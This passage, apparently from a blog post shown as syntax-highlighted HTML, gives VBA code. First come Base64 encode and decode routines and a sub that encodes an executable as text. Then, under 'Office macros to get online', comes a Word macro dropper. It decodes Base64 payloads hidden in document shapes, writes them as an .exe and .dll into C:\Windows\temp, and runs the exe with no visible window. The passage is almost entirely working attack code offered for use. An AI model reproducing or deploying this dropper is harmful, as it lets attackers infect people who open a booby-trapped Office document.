class="keyword">Error</span> <span class="keyword">GoTo</span> over     </span><br><span class="line">    <span class="keyword">Dim</span> Buf() <span class="keyword">As</span> <span class="type">Byte</span>, length <span class="keyword">As</span> <span class="type">Long</span>, mods <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    <span class="keyword">Const</span> B64_CHAR_DICT = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span></span><br><span class="line">    mods = (UBound(str) + <span class="number">1</span>) <span class="built_in">Mod</span> <span class="number">3</span>   </span><br><span class="line">    length = UBound(str) + <span class="number">1</span> - mods</span><br><span class="line">    <span class="keyword">ReDim</span> Buf(length / <span class="number">3</span> * <span class="number">4</span> + IIf(mods &lt;&gt; <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>) - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">Dim</span> I <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    <span class="keyword">For</span> I = <span class="number">0</span> <span class="keyword">To</span> length - <span class="number">1</span> <span class="keyword">Step</span> <span class="number">3</span></span><br><span class="line">        Buf(I / <span class="number">3</span> * <span class="number">4</span>) = (str(I) <span class="built_in">And</span> <span class="number">&amp;HFC</span>) / <span class="number">&amp;H4</span></span><br><span class="line">        Buf(I / <span class="number">3</span> * <span class="number">4</span> + <span class="number">1</span>) = (str(I) <span class="built_in">And</span> <span class="number">&amp;H3</span>) * <span class="number">&amp;H10</span> + (str(I + <span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;HF0</span>) / <span class="number">&amp;H10</span></span><br><span class="line">        Buf(I / <span class="number">3</span> * <span class="number">4</span> + <span class="number">2</span>) = (str(I + <span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;HF</span>) * <span class="number">&amp;H4</span> + (str(I + <span class="number">2</span>) <span class="built_in">And</span> <span class="number">&amp;HC0</span>) / <span class="number">&amp;H40</span></span><br><span class="line">        Buf(I / <span class="number">3</span> * <span class="number">4</span> + <span class="number">3</span>) = str(I + <span class="number">2</span>) <span class="built_in">And</span> <span class="number">&amp;H3F</span></span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">If</span> mods = <span class="number">1</span> <span class="keyword">Then</span></span><br><span class="line">        Buf(length / <span class="number">3</span> * <span class="number">4</span>) = (str(length) <span class="built_in">And</span> <span class="number">&amp;HFC</span>) / <span class="number">&amp;H4</span></span><br><span class="line">        Buf(length / <span class="number">3</span> * <span class="number">4</span> + <span class="number">1</span>) = (str(length) <span class="built_in">And</span> <span class="number">&amp;H3</span>) * <span class="number">&amp;H10</span></span><br><span class="line">        Buf(length / <span class="number">3</span> * <span class="number">4</span> + <span class="number">2</span>) = <span class="number">64</span></span><br><span class="line">        Buf(length / <span class="number">3</span> * <span class="number">4</span> + <span class="number">3</span>) = <span class="number">64</span></span><br><span class="line">    <span class="keyword">ElseIf</span> mods = <span class="number">2</span> <span class="keyword">Then</span></span><br><span class="line">        Buf(length / <span class="number">3</span> * <span class="number">4</span>) = (str(length) <span class="built_in">And</span> <span class="number">&amp;HFC</span>) / <span class="number">&amp;H4</span></span><br><span class="line">        Buf(length / <span class="number">3</span> * <span class="number">4</span> + <span class="number">1</span>) = (str(length) <span class="built_in">And</span> <span class="number">&amp;H3</span>) * <span class="number">&amp;H10</span> + (str(length + <span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;HF0</span>) / <span class="number">&amp;H10</span></span><br><span class="line">        Buf(length / <span class="number">3</span> * <span class="number">4</span> + <span class="number">2</span>) = (str(length + <span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;HF</span>) * <span class="number">&amp;H4</span></span><br><span class="line">        Buf(length / <span class="number">3</span> * <span class="number">4</span> + <span class="number">3</span>) = <span class="number">64</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">For</span> I = <span class="number">0</span> <span class="keyword">To</span> UBound(Buf)</span><br><span class="line">        Base64Encode = Base64Encode + <span class="keyword">Mid</span>(B64_CHAR_DICT, Buf(I) + <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line"><span class="symbol">over:</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;VB Base64 Encode/Decode：</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> Base64Decode(B64 <span class="keyword">As</span> <span class="type">String</span>) <span class="keyword">As</span> <span class="type">Byte</span>()    </span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">GoTo</span> over     </span><br><span class="line">    <span class="keyword">Dim</span> OutStr() <span class="keyword">As</span> <span class="type">Byte</span>, I <span class="keyword">As</span> <span class="type">Long</span>, j <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    <span class="keyword">Const</span> B64_CHAR_DICT = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span></span><br><span class="line">    <span class="keyword">If</span> InStr(<span class="number">1</span>, B64, <span class="string">&quot;=&quot;</span>) &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span> B64 = Left(B64, InStr(<span class="number">1</span>, B64, <span class="string">&quot;=&quot;</span>) - <span class="number">1</span>)  </span><br><span class="line">    <span class="keyword">Dim</span> length <span class="keyword">As</span> <span class="type">Long</span>, mods <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    mods = Len(B64) <span class="built_in">Mod</span> <span class="number">4</span></span><br><span class="line">    length = Len(B64) - mods</span><br><span class="line">    <span class="keyword">ReDim</span> OutStr(length / <span class="number">4</span> * <span class="number">3</span> - <span class="number">1</span> + Switch(mods = <span class="number">0</span>, <span class="number">0</span>, mods = <span class="number">2</span>, <span class="number">1</span>, mods = <span class="number">3</span>, <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">For</span> I = <span class="number">1</span> <span class="keyword">To</span> length <span class="keyword">Step</span> <span class="number">4</span></span><br><span class="line">        <span class="keyword">Dim</span> Buf(<span class="number">3</span>) <span class="keyword">As</span> <span class="type">Byte</span></span><br><span class="line">        <span class="keyword">For</span> j = <span class="number">0</span> <span class="keyword">To</span> <span class="number">3</span></span><br><span class="line">            Buf(j) = InStr(<span class="number">1</span>, B64_CHAR_DICT, <span class="keyword">Mid</span>(B64, I + j, <span class="number">1</span>)) - <span class="number">1</span>   </span><br><span class="line">        <span class="keyword">Next</span></span><br><span class="line">        OutStr((I - <span class="number">1</span>) / <span class="number">4</span> * <span class="number">3</span>) = Buf(<span class="number">0</span>) * <span class="number">&amp;H4</span> + (Buf(<span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;H30</span>) / <span class="number">&amp;H10</span></span><br><span class="line">        OutStr((I - <span class="number">1</span>) / <span class="number">4</span> * <span class="number">3</span> + <span class="number">1</span>) = (Buf(<span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;HF</span>) * <span class="number">&amp;H10</span> + (Buf(<span class="number">2</span>) <span class="built_in">And</span> <span class="number">&amp;H3C</span>) / <span class="number">&amp;H4</span></span><br><span class="line">        OutStr((I - <span class="number">1</span>) / <span class="number">4</span> * <span class="number">3</span> + <span class="number">2</span>) = (Buf(<span class="number">2</span>) <span class="built_in">And</span> <span class="number">&amp;H3</span>) * <span class="number">&amp;H40</span> + Buf(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">If</span> mods = <span class="number">2</span> <span class="keyword">Then</span></span><br><span class="line">        OutStr(length / <span class="number">4</span> * <span class="number">3</span>) = (InStr(<span class="number">1</span>, B64_CHAR_DICT, <span class="keyword">Mid</span>(B64, length + <span class="number">1</span>, <span class="number">1</span>)) - <span class="number">1</span>) * <span class="number">&amp;H4</span> + ((InStr(<span class="number">1</span>, B64_CHAR_DICT, <span class="keyword">Mid</span>(B64, length + <span class="number">2</span>, <span class="number">1</span>)) - <span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;H30</span>) / <span class="number">16</span></span><br><span class="line">    <span class="keyword">ElseIf</span> mods = <span class="number">3</span> <span class="keyword">Then</span></span><br><span class="line">        OutStr(length / <span class="number">4</span> * <span class="number">3</span>) = (InStr(<span class="number">1</span>, B64_CHAR_DICT, <span class="keyword">Mid</span>(B64, length + <span class="number">1</span>, <span class="number">1</span>)) - <span class="number">1</span>) * <span class="number">&amp;H4</span> + ((InStr(<span class="number">1</span>, B64_CHAR_DICT, <span class="keyword">Mid</span>(B64, length + <span class="number">2</span>, <span class="number">1</span>)) - <span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;H30</span>) / <span class="number">16</span></span><br><span class="line">        OutStr(length / <span class="number">4</span> * <span class="number">3</span> + <span class="number">1</span>) = ((InStr(<span class="number">1</span>, B64_CHAR_DICT, <span class="keyword">Mid</span>(B64, length + <span class="number">2</span>, <span class="number">1</span>)) - <span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;HF</span>) * <span class="number">&amp;H10</span> + ((InStr(<span class="number">1</span>, B64_CHAR_DICT, <span class="keyword">Mid</span>(B64, length + <span class="number">3</span>, <span class="number">1</span>)) - <span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;H3C</span>) / <span class="number">&amp;H4</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    Base64Decode = OutStr    </span><br><span class="line"><span class="symbol">over:</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> test2()</span><br><span class="line">    <span class="keyword">Dim</span> iFN <span class="keyword">As</span> <span class="type">Integer</span></span><br><span class="line">    <span class="keyword">Dim</span> sPath <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">    <span class="keyword">Dim</span> bFileSize <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    <span class="keyword">Dim</span> sResult <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">    <span class="keyword">Dim</span> arr() <span class="keyword">As</span> <span class="type">Byte</span> <span class="comment">&#x27; bytes array</span></span><br><span class="line">    <span class="keyword">Dim</span> arra() <span class="keyword">As</span> <span class="type">Byte</span> <span class="comment">&#x27; bytes array</span></span><br><span class="line">    <span class="keyword">Dim</span> infile, outfile, infileBase <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">    infile = <span class="string">&quot;C:\path\to\in.exe&quot;</span></span><br><span class="line">    outfile = <span class="string">&quot;C:\path\to\out.exe&quot;</span></span><br><span class="line"></span><br><span class="line">    iFN = VBA.FreeFile</span><br><span class="line"></span><br><span class="line">    bFileSize = VBA.FileLen(infile)</span><br><span class="line">    <span class="comment">&#x27;Debug.Print bFileSize</span></span><br><span class="line">    Open infile <span class="keyword">For</span> <span class="keyword">Binary</span> Access Read <span class="keyword">As</span> iFN</span><br><span class="line">    arr = InputB(bFileSize, iFN) <span class="comment">&#x27; read bytes</span></span><br><span class="line"></span><br><span class="line">    infileBase = Base64Encode(arr())</span><br><span class="line"></span><br><span class="line">    <span class="comment">&#x27;Debug.Print infileBase</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">Dim</span> FSO</span><br><span class="line">    <span class="keyword">Set</span> FSO = CreateObject(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Set</span> OutPutFile = FSO.OpenTextFile(<span class="string">&quot;C:\path\to\test.txt&quot;</span>, <span class="number">2</span>, <span class="literal">True</span>)</span><br><span class="line">    OutPutFile.Write (infileBase)</span><br><span class="line">    OutPutFile.Close</span><br><span class="line">    <span class="keyword">Set</span> FSO = <span class="literal">Nothing</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&#x27;Dim infileBaseExe As String</span></span><br><span class="line">    <span class="comment">&#x27;infileBaseExe = Range(&quot;J22&quot;).Value</span></span><br><span class="line">    <span class="comment">&#x27;infileBaseExe = infileBaseExe + Range(&quot;J23&quot;).Value</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&#x27;arra = Base64Decode(infileBase)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&#x27;WriteBinary outfile, arra</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure>

<p>Office macros to get online:</p>
<figure class="highlight vb"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Sub</span> Sleep <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> (<span class="keyword">ByVal</span> Milliseconds <span class="keyword">As</span> LongPtr)</span><br><span class="line"><span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> GetProcAddress <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> (<span class="keyword">ByVal</span> hModule <span class="keyword">As</span> LongPtr, <span class="keyword">ByVal</span> lpProcName <span class="keyword">As</span> <span class="type">String</span>) <span class="keyword">As</span> LongPtr</span><br><span class="line"><span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> LoadLibrary <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> <span class="keyword">Alias</span> <span class="string">&quot;LoadLibraryA&quot;</span> (<span class="keyword">ByVal</span> lpLibFileName <span class="keyword">As</span> <span class="type">String</span>) <span class="keyword">As</span> LongPtr</span><br><span class="line"><span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> VirtualProtect <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> (lpAddress <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> dwSize <span class="keyword">As</span> LongPtr, <span class="keyword">ByVal</span> flNewProtect <span class="keyword">As</span> <span class="type">Long</span>, lpflOldProtect <span class="keyword">As</span> <span class="type">Long</span>) <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line"><span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Sub</span> ByteSwapper <span class="keyword">Lib</span> <span class="string">&quot;kernel32.dll&quot;</span> <span class="keyword">Alias</span> <span class="string">&quot;RtlFillMemory&quot;</span> (Destination <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> length <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Fill <span class="keyword">As</span> <span class="type">Byte</span>)</span><br><span class="line"><span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Sub</span> Peek <span class="keyword">Lib</span> <span class="string">&quot;msvcrt&quot;</span> <span class="keyword">Alias</span> <span class="string">&quot;memcpy&quot;</span> (<span class="keyword">ByRef</span> pDest <span class="keyword">As</span> Any, <span class="keyword">ByRef</span> pSource <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> nBytes <span class="keyword">As</span> <span class="type">Long</span>)</span><br><span class="line"><span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> CreateProcess <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> <span class="keyword">Alias</span> <span class="string">&quot;CreateProcessA&quot;</span> (<span class="keyword">ByVal</span> lpApplicationName <span class="keyword">As</span> <span class="type">String</span>, <span class="keyword">ByVal</span> lpCommandLine <span class="keyword">As</span> <span class="type">String</span>, lpProcessAttributes <span class="keyword">As</span> Any, lpThreadAttributes <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> bInheritHandles <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> dwCreationFlags <span class="keyword">As</span> <span class="type">Long</span>, lpEnvironment <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> lpCurrentDriectory <span class="keyword">As</span> <span class="type">String</span>, lpStartupInfo <span class="keyword">As</span> STARTUPINFO, lpProcessInformation <span class="keyword">As</span> PROCESS_INFORMATION) <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line"><span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> OpenProcess <span class="keyword">Lib</span> <span class="string">&quot;kernel32.dll&quot;</span> (<span class="keyword">ByVal</span> dwAccess <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> fInherit <span class="keyword">As</span> <span class="type">Integer</span>, <span class="keyword">ByVal</span> hObject <span class="keyword">As</span> <span class="type">Long</span>) <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line"><span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> TerminateProcess <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> (<span class="keyword">ByVal</span> hProcess <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> uExitCode <span class="keyword">As</span> <span class="type">Long</span>) <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line"><span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> CloseHandle <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> (<span class="keyword">ByVal</span> hObject <span class="keyword">As</span> <span class="type">Long</span>) <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Private</span> Type PROCESS_INFORMATION</span><br><span class="line">    hProcess <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    hThread <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    dwProcessId <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    dwThreadId <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line"><span class="keyword">End</span> Type</span><br><span class="line"></span><br><span class="line"><span class="keyword">Private</span> Type STARTUPINFO</span><br><span class="line">    cb <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    lpReserved <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">    lpDesktop <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">    lpTitle <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">    dwX <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    dwY <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    dwXSize <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    dwYSize <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    dwXCountChars <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    dwYCountChars <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    dwFillAttribute <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    dwFlags <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    wShowWindow <span class="keyword">As</span> <span class="type">Integer</span></span><br><span class="line">    cbReserved2 <span class="keyword">As</span> <span class="type">Integer</span></span><br><span class="line">    lpReserved2 <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    hStdInput <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    hStdOutput <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    hStdError <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line"><span class="keyword">End</span> Type</span><br><span class="line"></span><br><span class="line"><span class="keyword">Const</span> CREATE_NO_WINDOW = <span class="number">&amp;H8000000</span></span><br><span class="line"><span class="keyword">Const</span> CREATE_NEW_CONSOLE = <span class="number">&amp;H10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> fileExist(filePath)</span><br><span class="line">    <span class="keyword">Dim</span> fso</span><br><span class="line">    <span class="keyword">Set</span> fso = CreateObject(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>)</span><br><span class="line">    <span class="keyword">If</span> fso.fileExists(filePath) <span class="keyword">Then</span></span><br><span class="line">        fileExist = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">Else</span></span><br><span class="line">        fileExist = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">Set</span> fso = <span class="literal">Nothing</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> dddddd(B64 <span class="keyword">As</span> <span class="type">String</span>) <span class="keyword">As</span> <span class="type">Byte</span>()</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">GoTo</span> over</span><br><span class="line">    <span class="keyword">Dim</span> OutStr() <span class="keyword">As</span> <span class="type">Byte</span>, i <span class="keyword">As</span> <span class="type">Long</span>, j <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    <span class="keyword">Const</span> B64_CHAR_DICT = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span></span><br><span class="line">    <span class="keyword">If</span> InStr(<span class="number">1</span>, B64, <span class="string">&quot;=&quot;</span>) &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span> B64 = Left(B64, InStr(<span class="number">1</span>, B64, <span class="string">&quot;=&quot;</span>) - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">Dim</span> length <span class="keyword">As</span> <span class="type">Long</span>, mods <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    mods = Len(B64) <span class="built_in">Mod</span> <span class="number">4</span></span><br><span class="line">    length = Len(B64) - mods</span><br><span class="line">    <span class="keyword">ReDim</span> OutStr(length / <span class="number">4</span> * <span class="number">3</span> - <span class="number">1</span> + Switch(mods = <span class="number">0</span>, <span class="number">0</span>, mods = <span class="number">2</span>, <span class="number">1</span>, mods = <span class="number">3</span>, <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">For</span> i = <span class="number">1</span> <span class="keyword">To</span> length <span class="keyword">Step</span> <span class="number">4</span></span><br><span class="line">        <span class="keyword">Dim</span> buf(<span class="number">3</span>) <span class="keyword">As</span> <span class="type">Byte</span></span><br><span class="line">        <span class="keyword">For</span> j = <span class="number">0</span> <span class="keyword">To</span> <span class="number">3</span></span><br><span class="line">            buf(j) = InStr(<span class="number">1</span>, B64_CHAR_DICT, <span class="keyword">Mid</span>(B64, i + j, <span class="number">1</span>)) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">Next</span></span><br><span class="line">        OutStr((i - <span class="number">1</span>) / <span class="number">4</span> * <span class="number">3</span>) = buf(<span class="number">0</span>) * <span class="number">&amp;H4</span> + (buf(<span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;H30</span>) / <span class="number">&amp;H10</span></span><br><span class="line">        OutStr((i - <span class="number">1</span>) / <span class="number">4</span> * <span class="number">3</span> + <span class="number">1</span>) = (buf(<span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;HF</span>) * <span class="number">&amp;H10</span> + (buf(<span class="number">2</span>) <span class="built_in">And</span> <span class="number">&amp;H3C</span>) / <span class="number">&amp;H4</span></span><br><span class="line">        OutStr((i - <span class="number">1</span>) / <span class="number">4</span> * <span class="number">3</span> + <span class="number">2</span>) = (buf(<span class="number">2</span>) <span class="built_in">And</span> <span class="number">&amp;H3</span>) * <span class="number">&amp;H40</span> + buf(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">If</span> mods = <span class="number">2</span> <span class="keyword">Then</span></span><br><span class="line">        OutStr(length / <span class="number">4</span> * <span class="number">3</span>) = (InStr(<span class="number">1</span>, B64_CHAR_DICT, <span class="keyword">Mid</span>(B64, length + <span class="number">1</span>, <span class="number">1</span>)) - <span class="number">1</span>) * <span class="number">&amp;H4</span> + ((InStr(<span class="number">1</span>, B64_CHAR_DICT, <span class="keyword">Mid</span>(B64, length + <span class="number">2</span>, <span class="number">1</span>)) - <span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;H30</span>) / <span class="number">16</span></span><br><span class="line">    <span class="keyword">ElseIf</span> mods = <span class="number">3</span> <span class="keyword">Then</span></span><br><span class="line">        OutStr(length / <span class="number">4</span> * <span class="number">3</span>) = (InStr(<span class="number">1</span>, B64_CHAR_DICT, <span class="keyword">Mid</span>(B64, length + <span class="number">1</span>, <span class="number">1</span>)) - <span class="number">1</span>) * <span class="number">&amp;H4</span> + ((InStr(<span class="number">1</span>, B64_CHAR_DICT, <span class="keyword">Mid</span>(B64, length + <span class="number">2</span>, <span class="number">1</span>)) - <span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;H30</span>) / <span class="number">16</span></span><br><span class="line">        OutStr(length / <span class="number">4</span> * <span class="number">3</span> + <span class="number">1</span>) = ((InStr(<span class="number">1</span>, B64_CHAR_DICT, <span class="keyword">Mid</span>(B64, length + <span class="number">2</span>, <span class="number">1</span>)) - <span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;HF</span>) * <span class="number">&amp;H10</span> + ((InStr(<span class="number">1</span>, B64_CHAR_DICT, <span class="keyword">Mid</span>(B64, length + <span class="number">3</span>, <span class="number">1</span>)) - <span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;H3C</span>) / <span class="number">&amp;H4</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    dddddd = OutStr</span><br><span class="line"><span class="symbol">over:</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> runCommand(comando)</span><br><span class="line">    <span class="keyword">Dim</span> pInfo <span class="keyword">As</span> PROCESS_INFORMATION</span><br><span class="line">    <span class="keyword">Dim</span> sInfo <span class="keyword">As</span> STARTUPINFO</span><br><span class="line">    <span class="keyword">Dim</span> sNull <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">    <span class="keyword">Dim</span> lSuccess <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    <span class="keyword">Dim</span> lRetValue <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line"></span><br><span class="line">    lSuccess = CreateProcess(sNull, comando, <span class="keyword">ByVal</span> <span class="number">0&amp;</span>, <span class="keyword">ByVal</span> <span class="number">0&amp;</span>, <span class="number">1&amp;</span>, CREATE_NO_WINDOW, <span class="keyword">ByVal</span> <span class="number">0&amp;</span>, sNull, sInfo, pInfo)</span><br><span class="line"></span><br><span class="line">    lRetValue = CloseHandle(pInfo.hThread)</span><br><span class="line">    lRetValue = CloseHandle(pInfo.hProcess)</span><br><span class="line"></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> WriteBinary(FileName, buf)</span><br><span class="line">  <span class="keyword">Dim</span> i, aBuf, Size, bStream</span><br><span class="line">  Size = UBound(buf): <span class="keyword">ReDim</span> aBuf(Size \ <span class="number">2</span>)</span><br><span class="line">  <span class="keyword">For</span> i = <span class="number">0</span> <span class="keyword">To</span> Size - <span class="number">1</span> <span class="keyword">Step</span> <span class="number">2</span></span><br><span class="line">      aBuf(i \ <span class="number">2</span>) = ChrW(buf(i + <span class="number">1</span>) * <span class="number">256</span> + buf(i))</span><br><span class="line">  <span class="keyword">Next</span></span><br><span class="line">  <span class="keyword">If</span> i = Size <span class="keyword">Then</span> aBuf(i \ <span class="number">2</span>) = ChrW(buf(i))</span><br><span class="line">  aBuf = <span class="keyword">Join</span>(aBuf, <span class="string">&quot;&quot;</span>)</span><br><span class="line">  <span class="keyword">Set</span> bStream = CreateObject(<span class="string">&quot;ADODB.Stream&quot;</span>)</span><br><span class="line">  bStream.Type = <span class="number">1</span>: bStream.Open</span><br><span class="line">  <span class="keyword">With</span> CreateObject(<span class="string">&quot;ADODB.Stream&quot;</span>)</span><br><span class="line">    .Type = <span class="number">2</span>: .Open: .WriteText aBuf</span><br><span class="line">    .Position = <span class="number">2</span>: .CopyTo bStream: .Close</span><br><span class="line">  <span class="keyword">End</span> <span class="keyword">With</span></span><br><span class="line">  bStream.SaveToFile FileName, <span class="number">2</span>: bStream.Close</span><br><span class="line">  <span class="keyword">Set</span> bStream = <span class="literal">Nothing</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> releaseFile(path <span class="keyword">As</span> <span class="type">String</span>, conte <span class="keyword">As</span> <span class="type">String</span>)</span><br><span class="line"></span><br><span class="line">    hwminiArra = dddddd(conte)</span><br><span class="line">    WriteBinary path, hwminiArra</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> start()</span><br><span class="line">    <span class="keyword">Dim</span> filePath <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">    filePath = <span class="string">&quot;C:\Windows\temp\aaaaaaa.exe&quot;</span></span><br><span class="line">    <span class="keyword">If</span> <span class="built_in">Not</span> fileExist(filePath) <span class="keyword">Then</span></span><br><span class="line">        releaseFile <span class="string">&quot;C:\Windows\temp\aaaaaaa.exe&quot;</span>, Replace(ActiveDocument.Shapes(<span class="number">1</span>).TextFrame.TextRange, Chr(<span class="number">13</span>), Empty)</span><br><span class="line">        releaseFile <span class="string">&quot;C:\Windows\temp\aaaaaaaaaaa.dll&quot;</span>, Replace(ActiveDocument.Shapes(<span class="number">2</span>).TextFrame.TextRange, Chr(<span class="number">13</span>), Empty)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    runCommand (filePath)</span><br><span class="line"></span><br><span class="line"><span class="keyword">End</span> 